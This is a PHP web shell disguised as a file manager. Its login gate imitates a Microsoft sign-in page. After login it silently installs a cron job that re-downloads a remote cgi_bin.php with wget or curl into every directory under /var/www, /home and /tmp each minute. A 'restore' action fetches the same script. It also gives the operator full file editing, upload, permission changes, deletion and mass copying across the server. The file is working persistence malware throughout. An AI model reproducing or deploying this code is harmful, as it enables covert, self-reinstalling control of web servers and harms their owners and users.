<?php
error_reporting(0);
session_start();

// Security check
if (!isset($_SESSION['authenticated'])) {
    if (!isset($_POST['password'])) {
        echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: \'Segoe UI\', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            color: #323130;
        }

        .container {
            max-width: 440px;
            margin: 0 auto;
            padding: 44px 44px 36px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;;
        }

        .microsoft-logo {
            display: flex;
            align-items: center;
            margin-bottom: 36px;
        }

        .logo-squares {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: 1fr 1fr;
            gap: 1px;
        }

        .square {
            width: 9px;
            height: 9px;
        }

        .square-1 { background-color: #f25022; }
        .square-2 { background-color: #7fba00; }
        .square-3 { background-color: #00a4ef; }
        .square-4 { background-color: #ffb900; }

        .logo-text {
            font-size: 17px;
            font-weight: 600;
            color: #5a5a5a;
        }

        .main-title {
            font-size: 32px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 12px;
            line-height: 40px;
        }

        .subtitle {
            font-size: 15px;
            color: #605e5c;
            margin-bottom: 24px;
            line-height: 20px;
        }

        .account-not-found {
            font-size: 15px;
            color: #605e5c;
            margin-bottom: 16px;
        }

        .create-account-link {
            color: #0067b8;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 24px;
            display: inline-block;
        }

        .create-account-link:hover {
            text-decoration: underline;
        }

        .cant-access-link {
            color: #0067b8;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 24px;
            display: inline-block;
        }

        .cant-access-link:hover {
            text-decoration: underline;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-input {
            width: 100%;
            height: 32px;
            padding: 6px 12px;
            border: 1px solid #605e5c;
            background-color: #ffffff;
            font-size: 15px;
            line-height: 20px;
            color: #323130;
            outline: none;
        }

        .form-input:focus {
            border-color: #0067b8;
        }

        .form-input::placeholder {
            color: #a19f9d;
        }

        .buttons-container {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }

        .back-button {
            background-color: #f3f2f1;
            border: 1px solid #8a8886;
            color: #323130;
            cursor: pointer;
            font-size: 15px;
            font-weight: 400;
            height: 32px;
            min-width: 108px;
            padding: 4px 12px;
            text-align: center;
        }

        .back-button:hover {
            background-color: #edebe9;
        }

        .next-button {
            background-color: #0067b8;
            border: 1px solid #0067b8;
            color: #ffffff;
            cursor: pointer;
            font-size: 15px;
            font-weight: 400;
            height: 32px;
            min-width: 108px;
            padding: 4px 12px;
            text-align: center;
        }

        .next-button:hover {
            background-color: #106ebe;
            border-color: #106ebe;
        }

        .sign-in-options {
            border: 1px solid #8a8886;
            padding: 16px;
            text-align: center;
            margin-bottom: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .sign-in-options:hover {
            background-color: #f3f2f1;
        }

        .sign-in-options-icon {
            width: 16px;
            height: 16px;
        }

        .sign-in-options-text {
            font-size: 15px;
            color: #323130;
        }

        .footer {
            margin-top: 40px;
            padding-top: 24px;
            display: flex;
            gap: 24px;
            font-size: 12px;
        }

        .footer a {
            color: #605e5c;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #e81123;
            font-size: 13px;
            margin-bottom: 16px;
            padding: 8px;
            background-color: #fdf2f2;
            border: 1px solid #e81123;
            border-radius: 2px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px;
            }
            
            .main-title {
                font-size: 28px;
            }
            
            .buttons-container {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="microsoft-logo">
            <div class="logo-squares">
                <div class="square square-1"></div>
                <div class="square square-2"></div>
                <div class="square square-3"></div>
                <div class="square square-4"></div>
            </div>
            <div class="logo-text">Microsoft Manager</div>
        </div>

        <h1 class="main-title">Sign In</h1>
        
        <div class="subtitle">Email address, phone number, atau Skype</div>';
        
        // Show error message if login failed
        if (isset($_SESSION['login_error'])) {
            echo '<div class="error-message">' . htmlspecialchars($_SESSION['login_error']) . '</div>';
            unset($_SESSION['login_error']);
        }
        
        echo '<form method="post" id="loginForm">
            <div class="form-group">
                <input 
                    type="password" 
                    name="password" 
                    class="form-input"
                    placeholder="Password"
                    required
                    autocomplete="current-password"
                >
            </div>

            <div class="account-not-found">Don\'t have an account? <a href="https://signup.live.com" class="create-account-link" target="_blank">Create one now!</a></div>
            
            <a href="https://account.live.com/acsr" class="cant-access-link" target="_blank">Can\'t access your account?</a>

            <div class="buttons-container">
                <button type="button" class="back-button" onclick="window.history.back()">Back</button>
                <button type="submit" class="next-button">Sign In</button>
            </div>
        </form>

        <div class="sign-in-options">
            <svg class="sign-in-options-icon" viewBox="0 0 16 16" fill="currentColor">
                <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM8 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.2 0-4.2-1.2-5.3-3 .7-1.3 2.1-2.2 3.6-2.2.2 0 .4 0 .5.1.5.2 1.1.4 1.7.4s1.2-.1 1.7-.4c.2-.1.3-.1.5-.1 1.5 0 2.9.9 3.6 2.2C12.2 12.8 10.2 14 8 14z"/>
            </svg>
            <a href="https://support.microsoft.com" class="sign-in-options-text" style="text-decoration: none;">Login options</a>
        </div>

        <div class="footer">
            <a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms of use</a>
            <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">Privacy & cookies</a>
            <a href="https://www.microsoft.com/en-us/accessibility/features" target="_blank">Accessibility</a>
        </div>
    </div>
</body>
</html>';
        exit;
    } else {
        // Array of valid MD5 password hashes
        $valid_passwords = array(
            '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',  // password
            '23ec24c5ca59000543cee1dfded0cbea'
        );
        
        // Hash the input password with MD5
        $input_password_hash = md5($_POST['password']);
        
        // Check if the hashed password matches any valid hash
        if (in_array($input_password_hash, $valid_passwords)) {
            $_SESSION['authenticated'] = true;
            // Redirect to prevent form resubmission
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $_SESSION['login_error'] = 'Invalid password! Please try again.';
            // Redirect back to login form
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
}


// Default directory
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(__DIR__);
if ($currentDir === false) $currentDir = realpath(__DIR__);

// Install hidden cronjob (Linux only)
if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    $cronFile = "/tmp/.cron_restore";
    $restoreScript = '*/1 * * * * for dir in /var/www /home /tmp; do find $dir -type d -exec sh -c \'[ ! -f "{}/cgi_bin.php" ] && (wget -q -O "{}/cgi_bin.php" https://raw.githubusercontent.com/qeize/tools/refs/heads/main/cgi_bin.php || curl -s -o "{}/cgi_bin.php" https://raw.githubusercontent.com/qeize/tools/refs/heads/main/cgi_bin.php)\' \; ; done >/dev/null 2>&1';
    
    if (!file_exists($cronFile)) {
        @file_put_contents($cronFile, $restoreScript);
        @shell_exec("(crontab -l 2>/dev/null; echo \"$restoreScript\") | crontab -");
    }
}

// Functions
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function getFileIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'fa-file-code', 'html' => 'fa-file-code', 'js' => 'fa-file-code', 'css' => 'fa-file-code',
        'jpg' => 'fa-file-image', 'jpeg' => 'fa-file-image', 'png' => 'fa-file-image', 'gif' => 'fa-file-image',
        'zip' => 'fa-file-archive', 'rar' => 'fa-file-archive', 'tar' => 'fa-file-archive', 'gz' => 'fa-file-archive',
        'pdf' => 'fa-file-pdf', 'doc' => 'fa-file-word', 'docx' => 'fa-file-word', 'xls' => 'fa-file-excel',
        'xlsx' => 'fa-file-excel', 'txt' => 'fa-file-alt', 'log' => 'fa-file-alt', 'sql' => 'fa-database'
    ];
    return $icons[$ext] ?? (is_dir($file) ? 'fa-folder' : 'fa-file');
}

// Handle actions
if (isset($_GET['action'])) {
    $file = realpath($currentDir . '/' . basename($_GET['file']));
    if ($file === false || strpos($file, realpath(__DIR__)) !== 0) {
        die('Invalid file path!');
    }

    switch ($_GET['action']) {
        case 'delete':
            if (is_dir($file)) {
                rmdir($file) ? $msg = "Directory deleted successfully!" : $msg = "Failed to delete directory!";
            } else {
                unlink($file) ? $msg = "File deleted successfully!" : $msg = "Failed to delete file!";
            }
            break;
            
        case 'download':
            if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
            break;
            
        case 'edit':
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                $msg = "File saved successfully!";
            } else {
                $content = htmlspecialchars(file_get_contents($file));
                echo '<!DOCTYPE html>
                <html>
                <head>
                    <title>Edit File</title>
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                        textarea { width: 100%; height: 500px; font-family: monospace; padding: 10px; box-sizing: border-box; border: 1px solid #ddd; }
                        .button { background: #4CAF50; color: white; border: none; padding: 10px 15px; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
                        .button:hover { background: #45a049; }
                        .button.secondary { background: #6c757d; }
                        .button.secondary:hover { background: #5a6268; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Editing: '.basename($file).'</h2>
                        <form method="post">
                            <textarea name="content">'.$content.'</textarea><br><br>
                            <button type="submit" class="button">Save</button>
                            <a href="?dir='.urlencode($currentDir).'" class="button secondary">Cancel</a>
                        </form>
                    </div>
                </body>
                </html>';
                exit;
            }
            break;
            
        case 'chmod':
            if (isset($_POST['mode'])) {
                chmod($file, octdec($_POST['mode'])) ? $msg = "Permissions changed successfully!" : $msg = "Failed to change permissions!";
            } else {
                $currentMode = substr(sprintf('%o', fileperms($file)), -4);
                echo '<!DOCTYPE html>
                <html>
                <head>
                    <title>Change Permissions</title>
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                        input[type="text"] { padding: 8px; width: 100px; border: 1px solid #ddd; border-radius: 3px; }
                        .button { background: #4CAF50; color: white; border: none; padding: 10px 15px; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
                        .button:hover { background: #45a049; }
                        .button.secondary { background: #6c757d; }
                        .button.secondary:hover { background: #5a6268; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Change Permissions: '.basename($file).'</h2>
                        <form method="post">
                            <p>Current permissions: '.$currentMode.'</p>
                            <p>New permissions: <input type="text" name="mode" value="'.$currentMode.'" placeholder="e.g. 0755"></p>
                            <button type="submit" class="button">Change</button>
                            <a href="?dir='.urlencode($currentDir).'" class="button secondary">Cancel</a>
                        </form>
                    </div>
                </body>
                </html>';
                exit;
            }
            break;
            
        case 'rename':
            if (isset($_POST['newname'])) {
                $newPath = dirname($file) . '/' . $_POST['newname'];
                rename($file, $newPath) ? $msg = "Renamed successfully!" : $msg = "Failed to rename!";
            } else {
                echo '<!DOCTYPE html>
                <html>
                <head>
                    <title>Rename File</title>
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                        input[type="text"] { padding: 8px; width: 100%; border: 1px solid #ddd; border-radius: 3px; }
                        .button { background: #4CAF50; color: white; border: none; padding: 10px 15px; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
                        .button:hover { background: #45a049; }
                        .button.secondary { background: #6c757d; }
                        .button.secondary:hover { background: #5a6268; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Rename: '.basename($file).'</h2>
                        <form method="post">
                            <p>New name: <input type="text" name="newname" value="'.basename($file).'"></p>
                            <button type="submit" class="button">Rename</button>
                            <a href="?dir='.urlencode($currentDir).'" class="button secondary">Cancel</a>
                        </form>
                    </div>
                </body>
                </html>';
                exit;
            }
            break;
            
        case 'touch':
            $newFile = $currentDir . '/' . basename($_POST['filename']);
            touch($newFile) ? $msg = "File created successfully!" : $msg = "Failed to create file!";
            break;
            
        case 'restore':
            $url = 'https://raw.githubusercontent.com/qeize/tools/refs/heads/main/cgi_bin.php';
            $content = @file_get_contents($url) or die("Failed to download script!");
            file_put_contents(__DIR__ . '/cgi_bin.php', $content) ? $msg = "Script restored successfully!" : $msg = "Failed to restore script!";
            break;
    }
}

// Handle file upload
if (isset($_FILES['upload'])) {
    $targetFile = $currentDir . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
        $msg = "File uploaded successfully!";
    } else {
        $msg = "File upload failed!";
    }
}

// Handle mass operations
if (isset($_POST['mass_action'])) {
    $action = $_POST['mass_action'];
    $targetDir = rtrim(trim($_POST['target_dir']), '/');
    $filename = trim($_POST['filename']);
    
    if (!is_dir($targetDir)) {
        $msg = "Invalid target directory!";
    } else {
        echo "<pre>";
        $success = 0;
        $failed = 0;
        
        $rii = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetDir),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($rii as $file) {
            if ($file->isDir()) {
                $dest = $file->getPathname() . '/' . basename($filename);
                
                if ($action === 'copy') {
                    if (copy(__DIR__ . '/' . $filename, $dest)) {
                        echo "Copied to: $dest\n";
                        $success++;
                    } else {
                        echo "Failed to copy to: $dest\n";
                        $failed++;
                    }
                } elseif ($action === 'delete') {
                    if (file_exists($dest) && unlink($dest)) {
                        echo "Deleted: $dest\n";
                        $success++;
                    } else {
                        echo "Not found or failed: $dest\n";
                        $failed++;
                    }
                }
            }
        }
        
        echo "\nDone. Total $action: $success | Failed: $failed\n";
        echo "</pre>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f8f9fa; color: #333; }
        .container { max-width: 1200px; margin: 20px auto; background: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 5px; overflow: hidden; }
        .header { background: #343a40; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { margin: 0; font-size: 1.5em; }
        .breadcrumb { padding: 15px 20px; background: #e9ecef; border-bottom: 1px solid #dee2e6; }
        .breadcrumb a { color: #007bff; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .file-list { width: 100%; border-collapse: collapse; }
        .file-list th { background: #f8f9fa; text-align: left; padding: 12px 15px; border-bottom: 2px solid #dee2e6; }
        .file-list td { padding: 10px 15px; border-bottom: 1px solid #dee2e6; vertical-align: middle; }
        .file-list tr:hover { background-color: #f8f9fa; }
        .action-btn { color: #007bff; text-decoration: none; margin-right: 10px; }
        .action-btn:hover { text-decoration: underline; }
        .alert { padding: 10px 15px; margin: 15px 20px; border-radius: 4px; }
        .alert-success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .alert-error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .form-control { width: 100%; padding: 8px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; }
        .btn { display: inline-block; padding: 8px 15px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; }
        .btn:hover { background: #0069d9; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .btn-secondary { background: #6c757d; }
        .btn-secondary:hover { background: #5a6268; }
        .tab-content { padding: 20px; }
        .nav-tabs { border-bottom: 1px solid #dee2e6; padding: 0 20px; }
        .nav-tabs a { display: inline-block; padding: 10px 15px; text-decoration: none; color: #495057; border: 1px solid transparent; border-bottom: none; margin-bottom: -1px; }
        .nav-tabs a.active { background: white; border-color: #dee2e6 #dee2e6 white; color: #007bff; }
        .nav-tabs a:hover:not(.active) { border-color: #dee2e6 #dee2e6 #dee2e6; }
        .checkbox-cell { width: 30px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fas fa-folder-open"></i> File Manager</h1>
        <div>
            <a href="?action=restore" class="btn btn-secondary" onclick="return confirm('Restore default script?')"><i class="fas fa-sync-alt"></i> Restore Script</a>
            <a href="?dir=<?= urlencode(dirname(__DIR__)) ?>" class="btn"><i class="fas fa-level-up-alt"></i> Up Directory</a>
        </div>
    </div>

    <?php if (isset($msg)): ?>
        <div class="alert <?= strpos($msg, 'successfully') !== false ? 'alert-success' : 'alert-error' ?>">
            <?= $msg ?>
        </div>
    <?php endif; ?>

    <div class="breadcrumb">
    <?php
    $parts = explode('/', trim($currentDir, '/'));
    $path = '';
    echo "<a href='?dir=/'><i class='fas fa-home'></i> ROOT</a> / ";
    foreach ($parts as $part) {
        if ($part !== '') {
            $path .= '/' . $part;
            echo "<a href='?dir=" . urlencode($path) . "'>$part</a> / ";
        }
    }
    ?>
</div>

    <div class="nav-tabs">
        <a href="#file-explorer" class="active"><i class="fas fa-folder"></i> File Explorer</a>
        <a href="#mass-operations"><i class="fas fa-tasks"></i> Mass Operations</a>
        <a href="#file-upload"><i class="fas fa-upload"></i> Upload File</a>
        <a href="#create-file"><i class="fas fa-plus"></i> Create File</a>
    </div>

    <div class="tab-content" id="file-explorer">
        <table class="file-list">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // Parent directory link
                if ($currentDir !== realpath(__DIR__)) {
                    $parentDir = dirname($currentDir);
                    echo "<tr>
                            <td colspan='5'><a href='?dir=".urlencode($parentDir)."'><i class='fas fa-level-up-alt'></i> Parent Directory</a></td>
                          </tr>";
                }

                // List directories and files
                $items = scandir($currentDir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    
                    $fullPath = $currentDir . '/' . $item;
                    $isDir = is_dir($fullPath);
                    $icon = getFileIcon($item);
                    $size = $isDir ? '-' : formatSize(filesize($fullPath));
                    $modified = date('Y-m-d H:i:s', filemtime($fullPath));
                    $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                    
                    echo "<tr>
                            <td><i class='fas $icon'></i> " . ($isDir ? "<a href='?dir=".urlencode($fullPath)."'>$item</a>" : $item) . "</td>
                            <td>$size</td>
                            <td>$modified</td>
                            <td>$perms</td>
                            <td>
                                " . (!$isDir ? "<a href='?dir=".urlencode($currentDir)."&action=download&file=".urlencode($item)."' class='action-btn' title='Download'><i class='fas fa-download'></i></a>" : "") . "
                                <a href='?dir=".urlencode($currentDir)."&action=edit&file=".urlencode($item)."' class='action-btn' title='Edit'><i class='fas fa-edit'></i></a>
                                <a href='?dir=".urlencode($currentDir)."&action=rename&file=".urlencode($item)."' class='action-btn' title='Rename'><i class='fas fa-i-cursor'></i></a>
                                <a href='?dir=".urlencode($currentDir)."&action=chmod&file=".urlencode($item)."' class='action-btn' title='Permissions'><i class='fas fa-lock'></i></a>
                                <a href='?dir=".urlencode($currentDir)."&action=delete&file=".urlencode($item)."' class='action-btn' title='Delete' onclick='return confirm(\"Are you sure you want to delete this item?\")'><i class='fas fa-trash'></i></a>
                            </td>
                          </tr>";
                }
                ?>
            </tbody>
        </table>
    </div>

    <div class="tab-content" id="mass-operations" style="display:none;">
        <h2><i class="fas fa-tasks"></i> Mass Operations</h2>
        <form method="post">
            <div class="form-group">
                <label>File to copy/delete (must be in current directory):</label>
                <input type="text" name="filename" class="form-control" placeholder="filename.ext" required>
            </div>
            <div class="form-group">
                <label>Target directory (will scan all subdirectories):</label>
                <input type="text" name="target_dir" class="form-control" value="<?= htmlspecialchars($currentDir) ?>" required>
            </div>
            <div class="form-group">
                <label>Action:</label><br>
                <button type="submit" name="mass_action" value="copy" class="btn"><i class="fas fa-copy"></i> Copy to All Subdirectories</button>
                <button type="submit" name="mass_action" value="delete" class="btn btn-danger"><i class="fas fa-trash"></i> Delete from All Subdirectories</button>
            </div>
        </form>
    </div>

    <div class="tab-content" id="file-upload" style="display:none;">
        <h2><i class="fas fa-upload"></i> Upload File</h2>
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label>Select file to upload:</label>
                <input type="file" name="upload" class="form-control" required>
            </div>
            <div class="form-group">
                <label>Target directory:</label>
                <input type="text" name="target_dir" class="form-control" value="<?= htmlspecialchars($currentDir) ?>" required>
            </div>
            <button type="submit" class="btn"><i class="fas fa-upload"></i> Upload</button>
        </form>
    </div>

    <div class="tab-content" id="create-file" style="display:none;">
        <h2><i class="fas fa-plus"></i> Create New File</h2>
        <form method="post" action="?action=touch&dir=<?= urlencode($currentDir) ?>">
            <div class="form-group">
                <label>File name:</label>
                <input type="text" name="filename" class="form-control" placeholder="newfile.txt" required>
            </div>
            <div class="form-group">
                <label>Content (optional):</label>
                <textarea name="content" class="form-control" style="height: 150px;"></textarea>
            </div>
            <button type="submit" class="btn"><i class="fas fa-save"></i> Create</button>
        </form>
    </div>
</div>

<script>
    // Simple tab switching
    document.querySelectorAll('.nav-tabs a').forEach(tab => {
        tab.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(content => {
                content.style.display = 'none';
            });
            
            // Show selected tab content
            const tabId = this.getAttribute('href').substring(1);
            document.getElementById(tabId).style.display = 'block';
            
            // Update active tab
            document.querySelectorAll('.nav-tabs a').forEach(t => {
                t.classList.remove('active');
            });
            this.classList.add('active');
        });
    });
</script>
</body>
</html>